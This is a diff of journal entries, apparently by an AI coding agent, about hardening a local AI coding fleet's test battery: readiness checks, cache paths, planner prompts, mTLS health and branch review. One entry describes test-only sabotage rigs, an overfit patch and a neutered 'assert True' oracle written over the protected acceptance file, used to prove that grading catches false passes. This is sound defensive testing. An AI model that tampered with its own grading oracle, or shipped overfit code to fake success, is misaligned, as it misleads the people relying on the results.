+`test_battery_runner.py` 31→42), so it lands today and tonight's 23:00 battery
+survives a flaky swap-back whether or not the residency happens first. **Fix 1** —
+the readiness hardening — is now built and offline-validated too: `real_backend_ready`
+requires several consecutive accepted connections (a bind-then-die listener passes the
+first and fails the rest) AND checks the spawned launcher process is still alive (a
+dead launcher aborts readiness fast, so the retry spawns fresh instead of trusting a
+lingering socket), with every probe outcome written to the swap-progress trail as the
+residency's zero-false-ready evidence. Its live-verify — 5+ sequential swap-backs, zero
+false-readies — rides the residency alongside #747's compile-cache and its
+non-negotiable live coder-load test. The pure-core driver tests are untouched (they
+inject their own `backend_ready`), so the hardening is provably backward-compatible
+(`test_swap_ops.py` + the driver/policy/gate suites 215 green).
+
+The diagnosis kept giving. Before banking B1/B2's PARKED-HONEST as reliability data,
+I read *why* they parked — and it was not a coder ceiling. Both jobs' decompose
+returned `surface=command-line, language_hint=null`; the fleet's build-profile
+resolver (`fleet-lib.ps1:683`, locked by `verify-buildprofile.ps1` BP5 as the "house
+default") maps command-line-with-no-hint to `dotnet-console`, so the coder was pinned
+to .NET and built C# — `Tests.cs`, `app.csproj` — for jobs whose acceptance oracle is
+`tests/test_job_acceptance.py` (Python) and whose cards declare `stack: python-lib`.
+The C# then failed to build (no Xunit reference) and both candidates idled out. The
+entire baseline arm, as configured, could not produce a GREEN: a category mismatch,
+not a capability measurement. The honesty machinery worked perfectly — it refused to
+call any of it done — but the number would have been an artifact. Stacked defects
+again, exactly the #748 warning.
+
+The fix is a governance call the LA delegated to me (clarifying, rightly, that
+"language" here means the *programming* language the coder writes in — Python vs C# —
+not his own English). For a Python-centric local AI whose every acceptance oracle is
+Python and whose operator will never type "in C#," defaulting an ambiguous
+command-line request to .NET is simply the wrong house default. I am changing it to
+Python (the explicit-C#/.NET prompt heuristic at `fleet-lib.ps1:870` still routes
+anyone who *asks* for C# correctly), which fixes the battery and makes real operator
+CLI dispatches sensible in one deterministic change — no model retraining, reversible,
+landed at a night boundary with a campaign-log note. That change ships next, in
+agentic-setup, gated on the Python scaffold actually producing a buildable skeleton.
+
+**Next:** land the command-line→Python default in agentic-setup (offline-verify the
+python scaffold builds); run the supervised residency for #750 fix 1 (instrumented
+backend_ready, 5+ swap-backs zero false-readies) + #747 compile-cache (live coder-load
+before merge); one supervised live node job to admit B3/B5/B7; then a clean battery
+night that measures real capability. Fold this fragment with the residency results.
+
+*(Lesson 213 tally.)*
+
+### 2026-07-06 — The saboteur you can only run in the lab
+
+*Plain summary: built the B8 rig-injection seam — the N1–N3 negative controls now
+fire through the REAL swap-driver gates via `simulate_job_plan(rigs=…)` and yield
+PARKED-HONEST, with the seam provably byte-identical and unreachable for any real
+dispatch; touches `shared/fleet/plan_graph.py`, a new `tests/fixtures/m2_rigs/
+rig_injection.py`, and a new `tests/integration/test_m2_rig_injection.py`. New
+lesson on test-only sabotage.*
+
+B8 is the M2 battery's negative carrier — a B1 clone that arms three rigs (N1: a
+task renames the export its dependent imports; N2: an overfit patch that passes its
+own unit tests but violates a job-oracle criterion; N3: a task that edits the
+protected oracle file). The runner already had teeth for it: `cross_check` rewrites
+any claimed GREEN on a rig-carrying job to FALSE-DONE. And the dry-run harness
+already produced PARKED-HONEST for a rig card. But that PARKED-HONEST was a
+**hard-coded honest fake** — the dry-run `execute_fn` writes a canned "rigs caught"
+scorecard without a single gate actually running. A hand-written honest verdict
+proves nothing; it is the mirror image of the FALSE-DONE it is supposed to guard
+against. The whole point of §9.3 — "a gate never watched failing is theater" — is
+that the negative has to *pull the trigger* on the real net.
+
+So the seam had to make each rig fire inside a real driver run. The L1 simulator
+(`simulate_job_plan`) already drives the genuine `_run_plan_waves` +
+`_run_job_acceptance` + `build_scorecard` over injected `SwapOps` fakes, so I
+extended *it* rather than build a parallel harness. N1 and N2 were clean: N1 fails
+the real wave-integration gate, so the real driver short-circuits, marks the
+dependent subtree `skipped`, and the real verdict function returns PARKED-HONEST
+(BUILD); N2 forces the real job oracle to fail on all-merged, unit-green code, and
+the same verdict function distinguishes unit-green from job-red. Neither is a new
+mechanism — they are the existing `integration-red` and `job-oracle-red` scenarios,
+now driven by the card's rig list instead of a plan-id prefix.
+
+N3 was the one with a real subtlety, and it is where the design earned its keep.
+N3's whole net is *restore-before-grade*, and that logic lives in exactly one place:
+`swap_ops.real_run_job_oracle`, which writes the plan-carried oracle bytes over
+whatever a merge left on disk *before* grading, then restores the tree. The
+simulator's scripted oracle never exercises that. So instead of scripting a status,
+the N3 rig wires the injected oracle to drive the **real** `real_run_job_oracle`
+against a genuinely tampered file: it plants a neutered `assert True` oracle on disk,
+hands the real function the original criterion, and grades via an injected runner
+that reads the file *at grade time*. The proof is that the graded bytes carry the
+original's marker (the plan bytes won), the status is `failed` (the real criterion
+the overfit violates), and the tree is restored exactly to the tamper afterward — so
+a neutered oracle can never manufacture a pass. A counterfactual test grades the
+tamper directly and watches it pass, so the rig is not vacuous.
+
+The trade-off I sat with was where the rig knowledge lives. The smaller-surface
+option was a single `rigs` param with everything — tampered-oracle payloads, the
+grader, the real-oracle wiring — baked into `plan_graph.py`. I rejected it: that
+bends a production module into an adversarial-rig library, and this project keeps
+rig knowledge in fixtures (the N6/N7 rigs are fixture files). So `plan_graph` gained
+only the thin, generic seam — a `rigs` list for the trivial N1/N2 steering and a
+`rig_oracle` override for N3's real net — and the rig payloads plus N3's
+restore-before-grade wiring went to `tests/fixtures/m2_rigs/rig_injection.py`. Two
+params, both defaulting to `None`.
+
+That default is the second half of the deliverable, and it is the part that would be
+easy to skip. A saboteur you build to catch failures is itself a failure if it can
+ever fire in production. So the regression lock proves two things: the seam is
+byte-identical with no rig armed (an empty run of the carrier plan is a clean GREEN),
+and it is structurally *unreachable* from the real dispatch path — `build_swap_ops →
+SwapOps → SwapDriver.run` never reference the simulator, and `SwapOps` (the injected
+boundary the live dispatch wires) carries no rig field. The rig steering exists only
+on the test-scaffolding `simulate_job_plan`. And the runner's `cross_check` stays the
+last line under all of it: a GREEN on the real B8 card is still rewritten FALSE-DONE.
+
+B8 is not enabled in the campaign config — the deliverable is the seam and its 15
+offline tests, dormant until its own live proof. The live proof is a real
+`coder-30b` residency against a sandbox repo where the three rigs are actually
+planted (a real rename, a real overfit, a real oracle edit), watching the real
+wave gate go red and the real restore-before-grade defeat the tamper on hardware —
+the same shape the standalone `m2_live_negatives_n1n2n3_2026-07-06.json` proof took,
+but now inside one B8 dispatch. Only after that does B8 join the overnight battery.
+
+**Next:** LA review + merge (a separate reviewer verifies this worktree branch); then
+the live B8 residency proof on the Arc 140V (rigs planted in a real sandbox repo, app
+closed, no other model resident); then enable B8 in the battery campaign config and
+queue the first overnight run.
+
+*(Files: `shared/fleet/plan_graph.py` — `simulate_job_plan` gains `rigs` +
+`rig_oracle` (both default None) and `JobPlanSimResult` gains `attribution`;
+`tests/fixtures/m2_rigs/rig_injection.py` (new, TEST-ONLY rig knowledge);
+`tests/integration/test_m2_rig_injection.py` (new, 15 tests). Committed as `<this>`.
+Touched-suite run 112 passed (97 prior + 15 new), broader fleet 276 passed +
+swap-driver/ops/coordinator 172 passed, GPU-free, LOCALAPPDATA redirected, no OVMS
+resident. B8 dormant — not enabled in the campaign config; the live 30B proof is the
+next step. Lesson 215.)*
+
+### 2026-07-06 — The cache that loaded a trap, and the live test that caught it
+
+*Plain summary: fixed #747 (OVMS compiled-model cache for the coder swap) — the
+#740/W7 `--cache_dir` revert was a PATH-FORMAT bug (a Windows backslash makes OVMS's
+folded plugin_config JSON invalid), so the fix is a forward-slash path. The
+non-negotiable live coder-load test proved the fix AND caught a second latent trap an
+offline check would have shipped: the cold-cache first load (289s) blows past the 240s
+deadline. Landed the forward-slash `--cache_dir` + a 240→480s deadline bump in both
+repos (`start-llm.ps1`, `swap_ops.real_load_30b`), pre-warmed the cache. Warm loads
+now 12s.*
+
+The compiled-model cache is free performance for a fleet that swaps the 30B in and
+out on every coding job — except W7 tried it, it broke the coder load live, and it got
+reverted. The revert note had the mechanism right: OVMS folds `--cache_dir` into the
+continuous-batching LLM node's `plugin_config` JSON as `CACHE_DIR`, and the Windows
+path `C:\Users\...` makes that JSON invalid — `\U` is not a valid escape — so OVMS
+refuses to start with "Plugin config is in wrong format." What it didn't have was the
+fix. A little reading settled it: OVMS's own docs enable the cache with a forward-slash
+path (`--cache_dir /models/.ov_cache`), and forward slashes need no JSON escaping. So
+the fix is one character class: build the cache path with `/`, not `\`.
+
+The ticket's central demand was that this be proven against a live `start-llm.ps1
+-Model coder-30b` start before merge — because an offline syntax check is exactly what
+let W7 through. That mandate earned its keep twice over. First it confirmed the fix:
+the OVMS log printed `Model cache is enabled: C:/Users/mrbla/agentic-setup/state/
+ovms-model-cache`, no plugin_config error, and 16 GB of `.cl_cache` compiled kernels
+appeared on disk. But the script *threw* — "did not become ready in 240s" — even
+though the model loaded fine a few seconds later. That is the trap an offline check
+would have shipped: the **cold** cache load has to compile the model *and write* 16 GB
+of cache, which measured ~289 s here — past the 240 s deadline. It would have false-
+failed the first swap on every fresh box and after every OVMS upgrade, attributed as a
+STALL, and looked exactly like W7's failure all over again. The warm load, once the
+cache exists, is **12 s**.
+
+So the real fix is two parts: the forward-slash `--cache_dir`, and a deadline that
+survives a cold compile. I bumped both ceilings that gate a load — `start-llm.ps1`'s
+own 240→480 s and the swap driver's `real_load_30b` 300→480 s (they have to move
+together, or the driver kills a legitimate cold compile the script is still waiting
+on) — and pre-warmed the cache so tonight's battery swaps take the 12 s path, not the
+289 s one. The never-zero teardown still restores the 14B if a load ever genuinely
+hangs to the new ceiling, so the only cost of the longer deadline is slightly slower
+failure detection on a true hang, which is rare.
+
+**Next:** the cache is warm, so tonight's battery loads are ~12 s each. Fold this with
+the #750 residency results. If an OVMS/driver upgrade ever invalidates the cache, the
+next load is a one-time ~289 s cold compile (within the new deadline) that re-warms it
+— worth a line in the upgrade runbook.
+
+*(Lesson 182 tally.)*
+
+### 2026-07-06 — The little toolkit that was really four things
+
+*Plain summary: fixed the M2 planner under-decomposition that collapsed a genuinely multi-part battery job (B2, a 4-unit diamond) to a single task — a two-layer fix: strengthen the decompose + split prompts against diminutive-framing under-scope (`shared/fleet/decompose.py`), and add a deterministic `build_job_plan` degrade so a <2-task plan runs the legacy per-task queue instead of an ungradeable 1-task plan-graph (`shared/fleet/swap_ops.py`). Recurrence of lesson 200.*
+
+Battery card B2 asks, in the operator's own gentle voice, for "a little toolkit that reads a piece of text and tells me things about it" — break it into words, then work out two counts (word frequency, and neighbouring-pair frequency), then pull both into one tidy report. That is a textbook four-stage pipeline, and the card declares it: units=4, a diamond, min four dependency edges, three waves, with a `tests/test_job_acceptance.py` oracle expected. On the live run it collapsed to a **single** task, `generate-report`. The cascade from there was quiet and total: one task means `generate_job_acceptance_oracle` refuses (it owns only ≥2-task jobs; the #690 per-task oracle owns the single-task shape), so no job oracle was written; the coder dutifully merged a working Python toolkit; and with no whole-goal oracle to grade it, the job was ungradeable and the verdict came back **STALLED [VERIFY]**. The galling part is that the decomposer is not broken — B1 (an expense CLI) had split cleanly into eight tasks night-one. B2 failed on *phrasing*. "A little toolkit" reads as small, and the prompt I inherited leans hard on "Prefer ONE task."
+
+I did the diagnosis offline before touching anything, because my first instinct — "the envelope split backstop from #691 must be disabled" — was wrong, and I've been bitten before by escalating a finding without checking the evidence. The deterministic gating was sound. The goal carries three independent-unit markers and is not a leaf, so the upper-bound recursive splitter (lesson 200's fail-safe insurance) *was* offered; and a genuine four-task response sails through `_collapse` untouched (I ran it: tokenize / word-freq / bigram / report all survive as features). So the collapse was purely the 14B returning one task from **both** the main decompose call and the "go finer" re-split — a prompt blind spot, not a plumbing bug. This is the exact mirror of #670: the guard we tuned so hard against *over*-splitting (the `is_leap_year`-into-nine explosion) now produced the opposite failure, *under*-splitting, the moment a real pipeline was described modestly.
+
+The fix is lesson 200 applied a second time — bound from both sides, cheapest lever first. The primary lever is the prompt: I added a DISTINCT-OUTPUT-PIPELINE rule to both the decompose and split templates, a shape-only few-shot pair (the little-toolkit-with-a-report → four tasks, sitting *beside* a rocket-themed calculator → one task, so the model sees both bounds), and an explicit instruction that diminutive words — "little", "simple", "tidy", "just" — describe tone, not count: count the distinct outputs, never the adjectives. Because this is prompt-shaped I can only offline-verify the structure — that a correct multi-task response is never wrongly re-collapsed, and that the guidance is doc-locked against a future silent edit — while the real proof (B2 emitting ≥2 tasks) is a GPU re-test the reviewer owns.
+
+But a prompt lever can always miss, and the honest question is what happens when it does. Today the answer was "the worst outcome available": a one-task *plan-graph* job, which is strictly worse than the legacy flat queue because it expects a job oracle it can't have and STALLs waiting. So the second layer is deterministic and has teeth: `build_job_plan` now degrades any sub-two-task plan to the flat queue (`plan=None`), where the per-task path — build/test/verify plus the #690 per-task oracle the task still carries — grades the lone task and it becomes GREEN-able. I weighed minting a synthetic one-task job oracle instead and rejected it: a single task doesn't *need* a whole-goal oracle, the per-task path already grades it, and degrading into that proven path (lesson 28) is far lower-risk than a new code path. I proved the degrade is load-bearing rather than cosmetic — `validate_plan` happily accepts a one-task in-bounds plan, so without this rule run_swap really would build and run the ungradeable graph. One care-point along the way: an existing "refusal degrades to flat queue" test used a one-task outside-repo list, so my new short-circuit would have silently gutted its containment-refusal intent — I bumped it to two tasks to keep it testing what it was written to test, and added a dedicated single-task-degrade test beside it.
+
+**Next:** the reviewer re-runs B2 on the Arc 140V. If Part 1 worked, decompose returns ≥2 tasks and a job oracle is generated — the diamond schedules across waves and can reach GREEN via job acceptance. If the 14B still under-scopes, Part 2 catches it: one task, but GREEN-able through the per-task oracle, never STALLED. Either branch is a pass; the distinction just tells us whether the prompt lever landed. A battery-wide re-run (B1/B2/B7 shapes) would confirm the prompt change didn't regress the goals that were already splitting correctly.
+
+*(Lesson 200 tally (third-instance control shipped).)*
+
+### 2026-07-06 — Proving the overnight web battery doesn't grab the screen (and the sibling that would have)
+
+*Plain summary: verified the #688 web design-capture and the opencode coder browser are both already headless, so the battery's node-web cards (B3 budget, B5 habit) run unattended without seizing the operator's screen; fixed `capture-app.ps1` `Find-AppExe` to exclude `node_modules` — a divergent-sibling defect that could launch + foreground a stray dependency `App.exe` (a real screen-take); locked both invariants with a `WC*` section in `verify-capture.ps1` and three BlarAI battery-card unattended-safety tests. Lesson class C15.*
+
+The task arrived as a suspicion: the M2 web battery renders each built page for the VLM design critique, and the memory note about WinUI demo-capture being a full-desktop grab made the whole capture path look like it might take over the screen overnight. If B3/B5 seize the display at 23:00, the unattended campaign is dead on arrival. So the first job was not to build a headless mode — it was to find out whether one was even needed, and to trust only what I could watch run.
+
+It was not needed. The web tier of `capture-app.ps1` already renders with `msedge --headless=new --screenshot`, and the opencode coder's browser tool is already `playwright-mcp --browser msedge --headless`. I proved the capture rather than reading it: a throwaway web project rendered through the real script produced an 11 KB PNG (magic `89 50 4E 47`, 1280×900) with a background thread polling visible top-level Edge windows — peak count **0**. The design loop's own routing reinforces it — a web surface has no `App.exe`, so Tiers 1 (WinUI off-screen render) and 2 (the *only* screen-taking tier: `SetForegroundWindow` + GDI `CopyFromScreen`) both skip, and the headless web tier fires. The battery grades the visual tier as eyeball-only (`human_tiers_expected: ["visual"]`, never in `must_verify_tiers`), so the critique is a loop signal, never a gate. And observing the live B7 dispatch that happened to be running confirmed the fleet-in-general opens no GUI window — only console windows and the resident OVMS.
+
+The honest part of the story is the defect I found while proving the safe case. I fed the same script a web dir carrying a stray `node_modules\pkg\App.exe`, and it mis-routed: `Find-AppExe` recurses for `App.exe` excluding only `.git`, so it *found* the dependency binary, skipped the headless web tier, and drove Tier 1 then **Tier 2 to launch and foreground that arbitrary binary** before collapsing to the blind structural floor. Had that stray exe been a real GUI tool, an unattended overnight run would have both executed a dependency binary and grabbed the screen. The fix was three characters of intent: `Find-AppExe`'s sibling in the very same file, `Find-WebEntry`, already excludes `node_modules|\.git` — the two "recurse the tree" helpers had diverged, and only one carried the guard. Matching them makes a web project route deterministically to the headless tier. Re-running the stray-exe case post-fix: `tier=web`, real PNG, 0 windows.
+
+I deliberately did not thread an explicit `surface` parameter through the four call sites (swap_driver → swap_ops → critique-loop → capture-app) to *force* headless for web. That would be the maximal fix, but the framing here was "prove it's safe and lock it," not re-plumb a working path; the node_modules exclusion closes the actual reproduced hole by matching the file's own established sibling, with no cross-repo signature churn. Surface-forcing is noted as a possible further hardening, not built. The change ships its own control: `WC1–WC12` in `verify-capture.ps1` lock `--headless=new`, the `node_modules` exclusion, the App.exe-gated ordering of the foreground tier, and an end-to-end proof that a web dir *with* the stray exe still captures headless `tier=web`; three tests in `test_battery_runner.py` lock the BlarAI-owned half (web ∈ `_DESIGN_SURFACES`; B3/B5 visual is eyeball-only; the live capture script is headless). The BlarAI live-script check asserts only `--headless=new` (true on `main` today), so it does not depend on the agentic-setup branch merging first.
+
+**Next:** the operator's live-verify — a real B3 or B5 web dispatch — should confirm the design-critique log shows `CAPTURE-OK ... tier=web` and no browser window appears. Merge both feature branches (BlarAI `feat/m2-web-headless-capture`; agentic-setup `feat/m2-web-headless-capture`). If overnight web volume grows, revisit surface-forcing so headlessness is a declaration, not a filesystem heuristic.
+
+*(Lesson 64 tally.)*
+
+### 2026-07-06 — The AO that answered the socket but not the handshake
+
+*Plain summary: a battery job STALLED [HARNESS] on `CERTIFICATE_VERIFY_FAILED` though `:5001` was listening; root-caused to the standing gate re-minting the repo `certs/` under a running AO (orphaning its in-memory CA), which the re-ensure's bare-socket readiness could not see; fixed durably by making `AoReensurer` readiness mTLS-aware (socket AND a real handshake, reboot on drift) in `tools/dispatch_harness/battery.py`, and by fixing the nightly launcher's fresh-boot to the tested detached path. Subsystem: M2 fleet battery / mTLS readiness.*
+
+I rebooted the AO, re-ran B2 to test the planner fix, and it came back in a
+second — `STALLED [HARNESS]`, "could not connect to the Assistant Orchestrator
+(is it running on :5001?)". But `:5001` *was* up; I had just watched it bind.
+The runner log had the real line the summary hid: `Host-mode loopback+mTLS
+connect failed: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed:
+certificate signature failure`. The socket answered; the handshake did not.
+
+The certs told the story by their timestamps. Every PEM in `certs/` — `ca.pem`,
+the gateway and orchestrator client certs, the PA server cert — was stamped
+13:58. The AO on `:5001` had booted at 13:42 (its `StartTime`, read straight off
+the process). Sixteen minutes apart. The launcher mints a fresh per-boot CA into
+`certs/` on every boot and an AO holds its minted certs in memory for its whole
+life, so a 13:42 AO presents a leaf signed by a CA that no longer exists on disk
+the moment something re-mints at 13:58 — and a client loading the new `ca.pem`
+cannot verify the old leaf. What re-minted at 13:58 was the standing gate I had
+just run: a production-boot integration test mints per-boot certs into the *real*
+`certs/` by design (the shipped PA config reads `certs/pa_server.pem`), and it
+does so under the running AO. My own sequencing — gate, then reuse the pre-gate
+AO — built the orphan. The guardrail that should have caught it didn't: I ran the
+gate with `LOCALAPPDATA` redirected exactly as told, but `certs/` lives in the
+*repo*, not under `LOCALAPPDATA`, so the redirect never covered it. That is
+lesson 55 recurring through a door its control does not reach.
+
+The instinct that mattered was the same one the #750 ticket taught: read the
+error, not the label. "AO is up" was true at the socket layer and false at the
+layer that matters. `ao_socket_ready`'s own docstring already says a single
+accepted connection is "liveness, not health" — but the re-ensure trusted it
+anyway, so an AO that accepted TCP and failed mTLS read as ready, the job
+dispatched, and the real turn died on the handshake. A bare-socket probe cannot
+see cert drift; only completing the handshake can.
+
+So the durable fix makes readiness mean what the dispatch needs. `AoReensurer`
+now checks socket liveness *and* a real mTLS handshake — reusing the exact client
+context the transport builds (`shared.ipc.vsock.create_client_ssl_context`,
+`CERT_REQUIRED`, hostname-check off) and the same gateway client cert the
+dispatch presents, so a pass here proves the dispatch will verify too. No
+application bytes are sent; the completed handshake is the whole proof. A socket
+that is up but whose leaf no longer verifies now reads NOT ready, so the existing
+reboot machinery re-mints and reloads one consistent set instead of the job
+stalling — the orphan self-heals in one reboot. I let it degrade to socket-only
+when the certs are absent (never true in production, where the launcher mints
+them at boot) so it can never loop on a reboot it cannot cure. Reproduced the
+drift deterministically in a test: a threaded loopback TLS server presenting a
+leaf signed by CA-A, probed once with CA-A (healthy → True) and once with a
+rotated CA-B (drift → False), plus the closed-port and absent-cert fail-closed
+cases.
+
+The trap had a second door I closed while I was here. The nightly launcher boots
+its AO with `Start-Process -WindowStyle Hidden` — the very spawn mode that
+crashed Textual on me this morning ("Driver must be in application mode"), where
+`DETACHED_PROCESS` succeeds — and on failure it *throws*, which would abort the
+whole night rather than let the runner's now-self-healing re-ensure recover it.
+I pointed the fresh-boot at the same tested `boot_launcher_detached` the runner
+uses and made the wait non-fatal (log and proceed; the per-job re-ensure is the
+backstop). It only bites the first night `:5001` is down at preflight — latent
+precisely because the campaign keeps an AO up — which is the kind of bug that
+waits for the worst night to fire.
+
+The honest cost line: today's stall was self-inflicted (I ran the gate under a
+live AO), and the reboot alone unblocked B2. But "my sequencing caused it" is not
+a fix — the nightly reuses any AO already on `:5001` without checking its certs,
+so the same orphan would poison a real night the moment anything re-mints certs
+under a long-lived AO. The self-heal is the fix; the reboot was first aid.
+
+**Next:** land D1 (battery mTLS-health readiness) + D2 (nightly detached boot)
+on their mains after B2 finishes and the full gate is re-run (the gate must not
+run concurrently with the live AO serving B2 — the very re-mint trap). Pin the
+exact gate test that mints repo `certs/` even with `:5001` in use and give it its
+own isolation (or extend the live-data redirect to repo-homed runtime material) —
+tracked as a follow-up, since the self-heal makes reliability robust regardless.
+Then the B2 planner-payoff verdict, and tonight's battery.
+
+*(Lessons 55 + 213 tallies; field notes.)*
+
+### 2026-07-06 — The verdict the flat queue never got to give (and the merge that would have eaten a day)
+
+*Plain summary: swap_driver's flat-queue REPORT phase now emits an m2-scorecard so the battery adopts a real verdict instead of synthesizing STALLED [HARNESS] (#752 F4); and reviewing the builder's branch caught a 35-commit-stale base a blind merge would have reverted. Subsystem: M2 fleet dispatch driver / battery scoring.*
+
+When B2's diamond collapses to one task, the run falls out of plan mode into the
+legacy flat queue, and `_emit_plan_artifacts` returned early on `self._plan is
+None` — writing no scorecard at all. The battery, finding no driver scorecard,
+could only *synthesize* STALLED [HARNESS] on a run that had actually finished. F4
+gives flat mode its own honest verdict, computed from the per-task outcomes and
+holding the same anti-FALSE-DONE line as the plan path: with no job oracle to
+prove the integrated whole, an all-merged flat run is STALLED/VERIFY, never GREEN;
+any non-merged task is PARKED-HONEST/BUILD. So B2 — whose candidates fail the
+seeded oracle's import — now scores a real honest RED, a valid measurement,
+instead of a harness shrug.
+
+The part worth keeping is the review. I dispatched a worktree builder for the fix;
+it returned reporting a clean two-file change, tests green but one — and it was
+right *about its own diff*. But its worktree was based on a main 35 commits stale,
+so `git diff main..branch` was 56 files and 8039 deletions: a blind `--no-ff`
+merge would have reverted D1's cert self-heal, tonight's GPU-from-source records,
+and #746/#748/#749. The builder's "2 files" was true relative to its stale base;
+the danger only appeared in the diff against *current* main and in the commit's
+own `git show --stat` (a genuine +506/−1). The recovery was to cherry-pick the one
+clean commit (`5d252dd` → `4e5bae9`) onto a fresh main-based branch — it auto-merged
+cleanly, keeping #748's oracle-seeding and #749's bridge intact while adding F4.
+Trusting the builder's report would have been the disaster; reviewing the real
+diff was the whole job.
+
+One honest test change rode along: `test_legacy_mode_plan_none_never_touches_new_seams`
+asserted flat mode touches no W-seams, but F4 makes it emit the REPORT-phase
+scorecard + JOB_SUMMARY (never the wave seams gate/oracle/pack). Rather than flip
+the assertion and let the name lie, I renamed it to
+`..._emits_report_scorecard_not_wave_seams` and asserted both halves.
+
+**Next:** #752 continues — F3 (the oracle API-contract mismatch that fails B2's
+import), F2 (author B2's job oracle), F1 (the spec under-decomposition, card-driven).
+Tonight's 23:00 battery exercises F4 live: B2 should score a valid RED, not STALLED.
+
+*(Lesson 52 tally.)*
+
+### 2026-07-06 — The oracle and the coder never agreed where the code lived
+
+*Plain summary: headless-dispatch acceptance layer (#752 F3) — the per-task #690
+oracle prompt (`_ORACLE_TEMPLATE`) and the coder prompt (`compile_prompts`) now
+pin to the SAME module layout. The oracle is told to import from the seeded `app`
+package (not an invented `calendar_math`/`text_analyzer`), and the coder is handed
+the oracle's CONCRETE imported symbols as a hard public-API contract. Closes B2's
+false-RED where the oracle `ModuleNotFound`ed at pytest collection and the job
+scored on plumbing, not logic. Recurrence of Canonical C4 (the seam, not the parts).*
+
+The fleet seeds a known-good python skeleton — an `app` package with `app/core.py`
+— and tells the coder to extend it. Independently, at plan time, the resident 14B
+writes a spec-blind acceptance oracle that the fleet seeds as a protected
+`tests/test_acceptance.py` and grades every best-of-N candidate against. Both halves
+were individually correct. But the oracle's instruction said "IMPORT what you test
+from a clearly-named module you choose (for example `from calendar_math import
+add_days`)" — so the model invented a top-level module the coder, pinned to `app`,
+never created. pytest could not even collect the oracle: `ModuleNotFoundError`
+before a single assertion ran. The job scored RED on import-plumbing, not on whether
+the coder's logic was right — B2's exact failure, and the most demoralizing kind of
+false negative, because the code under test might have been perfect.
+
+This is C4 wearing new clothes: two components, each internally consistent, with an
+unspecified contract in the seam between them. The fix pins the contract from both
+ends. The oracle template now names the already-present `app` package as the import
+source and forbids inventing a new top-level module, keeping the criteria-driven
+function naming intact. And because a small model will still drift, `compile_prompts`
+now parses the oracle's actual `import` / `from X import a, b` symbols (an `ast` walk
+with the stdlib + pytest + hypothesis filtered out) and states them to the coder
+verbatim as a hard requirement — "your public API MUST provide EXACTLY:
+`app.core.word_count`, … — the protected acceptance file imports these." The second
+half is the load-bearing one: it closes the loop even when the instruction fails, so
+the two sides agree by construction rather than by hope.
+
+The trade-off I took: I did NOT try to REWRITE a drifted oracle's imports back to
+`app`. Regex surgery on model-generated python makes every transform miss a new
+syntax error or a fresh false-RED — the same trap the node-oracle-seed-guard work
+rejected the same day. Instead I let the coder follow whatever the oracle actually
+imports: if the model ignores the `app` pin and imports `text_analyzer`, the coder
+is told to provide `text_analyzer.analyze` and the oracle runs. Agreement, not
+aesthetics, is what makes the gate honest — the `app` pin is the bias, the parsed
+contract is the guarantee. Everything stays fail-soft: an unparseable oracle yields
+no contract line and the generic "create exactly the module(s) it imports" guidance
+stands, byte-identical to before.
+
+Scope honesty: this is the SINGLE-task python path (`generate_acceptance_oracle` →
+`compile_prompts`), which is where B2 lives. The multi-task job oracle
+(`generate_job_acceptance_oracle`, #740) is a separate mechanism that already imports
+from the tasks' DECLARED contracts, so it does not share this specific defect; I left
+it untouched and flagged it rather than widening scope silently.
+
+**Next:** the first live single-task python dispatch after this lands is the real
+proof — the 14B's oracle should import from `app`, the coder's `app.core.*` should
+satisfy it, and the job should score on logic. If a live oracle still drifts, the
+parsed-contract line in the coder prompt is the backstop to watch.
+
+*(commit `<this>` — `shared/fleet/acceptance.py`: `_ORACLE_TEMPLATE` app-pin +
+`compile_prompts` import-contract parser `_oracle_import_contract`; +4 regression
+locks in `shared/tests/test_oracle_app_import_contract.py`. Mandated selection 257
+passed / 0 failed [F3 + integration-gate + decompose + acceptance]; oracle-adjacent
+blast radius +104 passed [plan_graph / m2_rigs / vikunja_bridge]. Base: current main
+`5b2bfd6`. Branch `fix/752-f3-oracle-app-package` — not merged. Lesson 92 tally.)*
+
+### 2026-07-06 — Letting the card build the diamond the model wouldn't
+
+*Plain summary: #752 F1/F2 — a new `shared/fleet/battery_plans.py` lets a battery card's declared `shape:"diamond"` inject a pre-built 4-arm decomposition + a job-level acceptance oracle into `generate_plan` via a generic `decomposition_override` seam, so B2 runs as its diamond instead of collapsing to the flat queue. Escalate-then-implement-contained; runtime↔test-fixture coupling localized behind one named module.*
+
+B2's card declares a four-unit diamond — tokenize → {word-frequencies, neighbour-pairs} → report — but every live dispatch collapsed it to one task. I traced why before touching anything: the card's shape lives only in the battery host process, the decomposition runs AO-side over the vsock wire, and the `PLAN_REQUEST` frame carries exactly `{repo, goal}`. So "make the card drive the decomposition" first looked like a brand-new dispatch seam threaded through the harness → gateway → coordinator → IPC wire → AO — a ten-file change touching the decompose→plan contract broadly. I stopped and escalated with two seam options rather than rushing it, because F4 had already made B2 an honest measurement so there was no fire.
+
+The approved shape (Seam 2) is the contained one: the AO already receives the sandbox repo slug (`battery-b2-text-stats`) and boots from the checkout, so it can resolve the card by repo from `evals/battery/` and hand `generate_plan` a pre-built decomposition — no wire change, no harness/coordinator edits. The discipline the reviewer insisted on, and the part I'd defend at the cert board, is where the coupling lives. `generate_plan` gained exactly ONE generic parameter (`decomposition_override`) and knows nothing of cards; every battery-specific fact — the arm builder, the oracle bytes, the card lookup — sits behind `battery_plans.resolve_plan_override`, which returns `None` for any repo whose name doesn't start with `battery-` WITHOUT reading a card. That fast-path guard is what lets me claim, and a test assert, that production plan generation is byte-identical: a frozen-dataclass equality check proves `decomposition_override=None` is indistinguishable from not passing it, and a spy proves the 14B decomposer is still called on the normal path and skipped only under an override.
+
+The trade-off I accepted, on the record: runtime plan code now reads a test-battery fixture directory. I went with that over threading card shape across the wire because the blast radius is a single named module plus a guard the non-battery path never crosses — versus a wire-format change and five signatures — accepting that `shared/fleet` now has one file that knows the battery exists. A diamond card with no registered arm builder fails closed to `None` (never inject a shape we can't author), so this doesn't quietly generalise into "runtime trusts arbitrary cards."
+
